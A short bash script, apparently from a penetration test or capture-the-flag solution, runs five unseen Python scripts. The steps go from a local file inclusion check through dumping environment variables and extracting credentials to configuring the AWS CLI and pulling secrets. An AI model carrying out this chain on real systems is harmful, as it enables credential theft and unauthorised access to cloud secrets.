#!/bin/bash
set -e  # exit on first error

echo "[*] Step 1: LFI check"
/usr/bin/python3 01_lfi_check.py

echo "[*] Step 2: Dump environ"
/usr/bin/python3 02_dump_environ.py

echo "[*] Step 3: Extract creds"
/usr/bin/python3 03_extract_creds.py

echo "[*] Step 4: Configure AWS CLI"
/usr/bin/python3 04_configure_aws.py

echo "[*] Step 5: Get Secrets"
/usr/bin/python3 05_get_secrets.py

echo "[+] Done!"
